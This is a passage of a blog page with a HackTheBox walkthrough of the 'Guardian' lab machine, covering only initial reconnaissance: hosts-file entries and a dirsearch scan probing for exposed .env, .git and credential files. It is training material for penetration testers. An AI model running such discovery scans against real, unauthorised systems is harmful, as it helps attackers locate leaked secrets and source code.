<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Qubt theme for Hugo"><title>Hacking Articles</title>
<meta name=title content="Hacking Articles"><meta name=author content="Richie-Havoc"><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=google-adsense-account content="ca-pub-4834846196060641"><link type=text/css rel=stylesheet href=/css/main.bundle.min.c34ab593f7850b8e7984a77537a338f026bd2efcfe1715fbab66bda06475ab85.css integrity="sha256-w0q1k/eFC455hKd1N6M48Ca9Lvz+FxX7q2a9oGR1q4U="><script defer src=/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script><link rel=apple-touch-icon sizes=180x180 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_180x180_resize_box_3.png><link rel=icon type=image/png sizes=32x32 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_32x32_resize_box_3.png><meta property="og:url" content="https://havocsec.me/pentesting/htb/htb3/"><meta property="og:site_name" content="Hacking Articles"><meta property="og:title" content="Guardian HTB"><meta property="og:description" content="A step-by-step penetration testing walkthrough of the Guardian machine on HackTheBox."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="pentesting"><meta property="article:published_time" content="2025-10-28T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="og:image" content="https://havocsec.me/thumbnail.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://havocsec.me/thumbnail.png"><meta name=twitter:title content="Guardian HTB"><meta name=twitter:description content="A step-by-step penetration testing walkthrough of the Guardian machine on HackTheBox."><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=keywords content="hacking articles,hacking articles blog,hacking articles tutorials,hacking articles writeups,ethical hacking articles,cybersecurity articles,security hacking articles,penetration testing articles,infosec articles,cyber security hacking articles,cybersecurity,ethical hacking,CTF writeups,penetration testing,security research,bug bounty,offensive security,infosec,hackthebox,web exploitation,havoc,Richie havoc,htb,learn ethical hacking,hacking tutorials for beginners,cybersecurity tutorials,how to hack ethically,penetration testing course,security researcher blog,hacking step by step guide,ethical hacking examples,real world hacking scenarios,practical hacking exercises,Hercules,Soulmate,Darkcorp,Darkzero,Writeup,Bugbounty,htb writeups,hackthebox walkthrough,hackthebox solutions,penetration testing tutorials,linux privilege escalation,windows privilege escalation,active directory hacking,OSCP preparation,cyber security blog,vulnerability research,exploit development,reverse engineering,binary exploitation,pwn challenges,web security,network security,cryptography challenges,tryhackme,offsec labs,BoardLight HTB,Instant HTB,Sea HTB,Cicada HTB,Intuition HTB,Sightless HTB,Editorial HTB,Runner HTB,Greenhorn HTB,Blazorized HTB,Surveillance HTB,Headless HTB,Crafty HTB,Bizness HTB,Mist HTB,Usage HTB,Perfection HTB,Builder HTB,WifineticTwo HTB,Cap HTB,Analysis HTB,Keeper HTB,ctf challenges,capture the flag,cyber defense,red team operations,blue team defense,malware analysis,forensics challenges,steganography,OSINT techniques,kali linux tutorials,metasploit framework,burp suite tutorials,nmap scanning,sql injection,xss exploitation,privilege escalation techniques,buffer overflow,rop chain,shellcode development,reverse shell,web shell,docker security,kubernetes pentesting,cloud security,aws security,azure pentesting,api security testing,jwt exploitation,owasp top 10,security certifications,CEH preparation,OSWE preparation,OSCE preparation,NanoCorp HTB,NanoCorp walkthrough,NanoCorp writeup,NanoCorp HTB writeup,HTB NanoCorp exploitation,HTB NanoCorp solution,HackTheBox NanoCorp,NTLM relay attacks,NTLM relay exploitation,responder NTLM relay,ntlmrelayx tutorial,windows active directory exploitation,windows privilege escalation techniques,windows enumeration techniques,SMB relay attacks,credential discovery techniques,hard difficulty HTB machines,advanced windows hacking,active directory pentesting guide,windows security assessment,windows post exploitation,domain controller exploitation,kerberos attacks,pass the hash,lateral movement techniques,bloodhound enumeration,impacket tools,windows pentesting,HTB hard machines 2025,HTB season 9 machines,advanced AD attacks,HTB NanoCorp writeup,HTB NanoCorp Machine writeup,nanocorp.htb,CVE-2025-24071,HTB NanoCorp exploitation,DCOM exploitation,Windows DCOM attacks,DACL Abuse,best hacking articles website,top cybersecurity writeup blogs,where to find CTF writeups,detailed penetration testing tutorials,comprehensive hacking guides,step by step hacking tutorials,beginner to advanced ethical hacking,free hacking learning resources,cybersecurity blog 2025,latest hacking techniques,modern exploitation methods,practical security research,how to solve CTF challenges,how to hack hackthebox machines,privilege escalation methods explained,web application security testing,how to find vulnerabilities,penetration testing methodology,OSCP exam preparation tips,HTB machine walkthrough,CTF challenge solutions,security assessment guide,metasploit tutorials,burp suite guides,nmap cheat sheet,gobuster usage,hydra brute force,sqlmap injection,netcat reverse shell,wireshark packet analysis,john the ripper tutorial,hashcat cracking guide,OSCP certification preparation,CEH study materials,bug bounty hunter tips,cybersecurity career guide,penetration tester roadmap,ethical hacker certification,security researcher career path,infosec job preparation,2025 hacking tutorials,latest CVE exploits,zero day vulnerabilities,current cybersecurity threats,modern web exploitation,cloud security testing,API security vulnerabilities,container security hacking,AI security research,machine learning vulnerabilities,alternative to ippsec,similar to hackingarticles,best ctf writeup sites,top penetration testing blogs,ethical hacking resources,cybersecurity learning platforms,hacking practice labs,hacking community,infosec community blog,cybersecurity forum,ethical hacking discord,CTF community,bug bounty community,security researchers network"><meta name=author content="Richie-Havoc"><link rel=canonical href=https://havocsec.me/pentesting/htb/htb3/><meta name=google-site-verification content="5kNQmF94i_v9xe8c753YHZ660ypehgkIpd5I_5VOPL0"><meta name=msvalidate.01 content="FC9BD45C329063D600401FC9551479B8"><meta property="og:type" content="article"><meta property="og:url" content="https://havocsec.me/pentesting/htb/htb3/"><meta property="og:title" content="Guardian HTB"><meta property="og:description" content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta property="og:image" content><meta property="og:site_name" content="Hacking Articles"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2025-10-28T00:00:00Z"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="article:author" content="Richie-Havoc"><meta name=twitter:card content="summary_large_image"><meta name=twitter:url content="https://havocsec.me/pentesting/htb/htb3/"><meta name=twitter:title content="Guardian HTB"><meta name=twitter:description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=twitter:image content><meta name=twitter:site content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=twitter:creator content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=robots content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=yandex content="index, follow"><meta name=baiduspider content="index, follow"><meta name=language content="English"><meta name=revisit-after content="7 days"><meta name=rating content="General"><meta name=tagline content="Advanced Ethical Hacking & Security Research Platform"><meta name=slogan content="Learn. Hack. Share. Repeat."><meta name=category content="Technology"><meta name=topic content="Cybersecurity, Ethical Hacking, Penetration Testing"><meta name=coverage content="Worldwide"><meta name=distribution content="Global"><meta name=target content="all"><meta name=audience content="Security Researchers, Ethical Hackers, CTF Players, Penetration Testers, Bug Bounty Hunters, Cybersecurity Students"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=apple-mobile-web-app-title content="Hacking Articles"><meta name=article:section content="pentesting"><meta name=article:subtitle content="A detailed walkthrough of the Guardian machine on HackTheBox"><meta name=article:summary content="A step-by-step penetration testing walkthrough of the Guardian machine on HackTheBox."><meta property="article:publisher" content="https://havocsec.me"><meta name=publisher content="Hacking Articles"><meta name=copyright content="© 2025 Hacking Articles. All rights reserved."><meta name=alexaVerifyID content><meta name=norton-safeweb-site-verification content><meta name=thumbnail content><meta itemprop=name content="Guardian HTB"><meta itemprop=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta itemprop=image content><script type=application/ld+json>{"@context":"https://schema.org","@type":"HowTo","name":"Guardian HTB","description":"A step-by-step penetration testing walkthrough of the Guardian machine on HackTheBox.","image":"","datePublished":"2025-10-28T00:00:00Z","author":{"@type":"Person","name":"Richie-Havoc"},"publisher":{"@type":"Person","name":"Richie-Havoc"}}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/havocsec.me\/"},{"@type":"ListItem","position":2,"name":"Pentesting","item":"https:\/\/havocsec.me\/pentesting/"},{"@type":"ListItem","position":3,"name":"Guardian HTB","item":"https:\/\/havocsec.me\/pentesting\/htb\/htb3\/"}]}</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-M2657LXPFW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-M2657LXPFW",{anonymize_ip:!0,send_page_view:!0})</script><meta name=htb-status content="active"><meta name=htb-retire content="2025-12-15"><meta name=htb-machine content="Guardian HTB"><script defer src=/js/htb-lock.min.8e60d76f7ed9b9c13cf2e4c3a5c793c6d1c62fe602afb5e4ef6143c03afca885.js integrity="sha256-jmDXb37ZucE88uTDpceTxtHGL+YCr7Xk72FDwDr8qIU="></script><link rel=stylesheet href=/css/htb-lock.min.189e4cc3c0aae97ea28bae651944806deba67932e2f485e2d05d9d4771ff1d07.css integrity="sha256-GJ5Mw8Cq6X6ii65lGUSAbeumeTLi9IXi0F2dR3H/HQc="><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script></head><body class="flex h-screen flex-col justify-between bg-neutral-100 dark:bg-neutral-800"><div><header class="sticky top-0 z-10 bg-neutral-100 dark:bg-neutral-800"><section class="mx-auto flex max-w-(--breakpoint-xl) items-center justify-between p-4"><a href=https://havocsec.me/ class="flex items-center space-x-3"><img src=/logo_hu74b16e164104d2d61e05b7604a924e01_486235_filter_7015326143714700434.webp class="h-8 w-8" alt=Logo>
<span class="self-center whitespace-nowrap text-2xl font-semibold text-slate-700 dark:text-slate-400">Hacking Articles</span></a><div class="flex flex-row space-x-8"><nav class="hidden space-x-8 text-xl md:block" aria-label=main><a href=/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav><button id=theme-toggle type=button class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label=theme-switcher>
<svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001.0 1010.586 10.586z"/></svg>
<svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10 2a1 1 0 011 1v1A1 1 0 119 4V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707A1 1 0 1113.536 5.05l.707-.707a1 1 0 011.414.0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707A1 1 0 004.343 5.757l.707.707zm1.414 8.486-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"/></svg>
</button>
<button id=hamburger-button class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label=hamburger-button><div class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded-sm bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded-sm before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded-sm after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 dark:before:bg-slate-400 dark:after:bg-slate-400"></div></button></div></section><section id=mobile-menu class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800"><nav class="flex min-h-screen flex-col items-center py-8" aria-label=mobile><a href=/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav></section></header><main><div class="justify-left mx-auto mt-8 flex max-w-(--breakpoint-md) px-4"><article><h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">Guardian HTB</h1><h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">A detailed walkthrough of the Guardian machine on HackTheBox</h2><div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">Oct 28, 2025 - 16 minute read</div><div class="flex flex-col"><img class="mt-4 h-full w-full object-cover" src=/guard_huacb7bb51a17ee342906c03a04fb3988b_114400_filter_11492400015018413633.webp alt="feature image" height=459 width=736>
<span class="mb-4 mt-1 text-center text-sm text-slate-700 dark:text-slate-200">challenges</span></div><span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-(--breakpoint-md) prose-code:before:hidden prose-code:after:hidden"><h2 id=enumeration>Enumeration</h2><h3 id=nmap>Nmap</h3><p><img src=images/nmap.png alt=nmap.png></p><p>After that we go next.</p><p>Added these to <code>/etc/hosts</code> file in my machine :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>  10.10.11.84  guardian.htb
</span></span></code></pre></div><p><strong>Web Enumeration</strong></p><p>go to the web link <strong><a href=http://guardian.htb>http://guardian.htb</a></strong></p><p><img src=images/uni.png alt=uni.png></p><p>When hover to <code>Student Portal</code>, we got another subdomain. juicy!</p><p><img src=images/sub.png alt=sub.png></p><p>Then we update the <strong>/etc/hosts</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>10.10.11.84  guardian.htb portal.guardian.htb
</span></span></code></pre></div><p>Then we access the portal link  <code>http://portal.guardian.htb</code></p><p>Did some recon and got some emails:</p><p><img src=images/recon.png alt=recon.png></p><p>so lets do some recon and here we are finding any subdomains so we use dirsearch.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>venv<span style=color:#f92672>)</span>─<span style=color:#f92672>(</span>havoc㉿havoc<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Downloads/htb/guardian<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─$ dirsearch -u http://portal.guardian.htb/
</span></span><span style=display:flex><span>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
</span></span><span style=display:flex><span>  from pkg_resources import DistributionNotFound, VersionConflict
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  _|. _ _  _  _  _ _|_    v0.4.3
</span></span><span style=display:flex><span> <span style=color:#f92672>(</span>_<span style=color:#f92672>||</span>| _<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>/_<span style=color:#f92672>(</span>_<span style=color:#f92672>||</span> <span style=color:#f92672>(</span>_| <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style=color:#ae81ff>25</span> | Wordlist size: <span style=color:#ae81ff>11460</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Output File: /home/havoc/Downloads/htb/guardian/reports/http_portal.guardian.htb/__25-10-28_13-34-09.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Target: http://portal.guardian.htb/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:09<span style=color:#f92672>]</span> Starting: 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:25<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.env
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git-credentials
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git.json
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git-rewrite/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/branches/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/COMMIT_EDITMSG
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/config
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/description
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/HEAD
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/head
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/hooks/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/hooks/applypatch-msg
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/hooks/commit-msg
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/hooks/post-update
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/hooks/pre-applypatch
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/hooks/pre-push
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/hooks/pre-commit
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/hooks/pre-rebase
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/hooks/prepare-commit-msg
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/hooks/update
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/index
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/info/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/hooks/pre-receive
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/info/attributes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/info/exclude
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/info/refs
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/logs/HEAD
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/logs/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/logs/refs
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/logs/head
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/logs/refs/heads
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/logs/refs/heads/master
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/logs/refs/remotes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/logs/refs/remotes/origin
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/logs/refs/remotes/origin/HEAD
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/objects/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/logs/refs/remotes/origin/master
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/FETCH_HEAD
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/objects/info/packs
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/packed-refs
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/refs/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/refs/heads
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/refs/heads/master
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/refs/remotes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/refs/remotes/origin
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/refs/tags
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/refs/remotes/origin/HEAD
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git2/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git/refs/remotes/origin/master
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.git_release
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitattributes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitchangelog.rc
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitconfig
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.github/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.github/workflows/blank.yml
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.github/PULL_REQUEST_TEMPLATE.md
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.github/ISSUE_TEMPLATE.md
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.github/workflows/ci.yml
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.github/workflows/dependabot.yml
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.github/workflows/docker.yml
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.github/workflows/master.yml
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.github/workflows/maven.yml
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.github/workflows/nodejs.yml
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.github/workflows/publish.yml
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitignore
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitignore.orig
